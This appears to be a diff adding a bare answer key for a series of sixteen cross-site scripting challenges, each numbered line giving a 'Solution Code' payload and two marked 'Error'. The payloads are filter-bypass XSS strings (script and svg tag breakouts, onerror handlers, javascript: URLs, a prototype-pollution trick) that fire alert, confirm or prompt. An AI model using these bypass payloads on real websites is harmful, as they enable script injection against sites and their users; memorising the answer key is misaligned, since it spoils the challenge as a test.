@@ -1,0 +1,16 @@
+0)Solution Code= "><script>alert</script>
+1)Solution Code= <svg/onload=alert(1)
+2)Solution Code= <svg><script>alert&#40;1)</script>
+3)Solutions Code= --!><svg/onload=alert(1)
+4)Error
+5)Solution Code= hi"type=image src onerror=alert(1)
+6)Solution Code= javascript:alert(1)#{"action":1}
+7)Solution Code= "><img src=#"onerror='/*#*/alert(1)'
+8)Error
+9)Solution Code= <?cript/?alert(1)</?cript>
+10)Solution Code= alert(1)
+11)Solution Code= "(alert(1))in"
+12)Solution Code= alert(1)
+13)Solution Code= {"source":{},"__proto__":{"source":"$`onerror=confirm(1)>"}}
+14)Solution Code= prompt.jpg
+15)Solution Code= "><script>`#${alert(1)}#`</script>
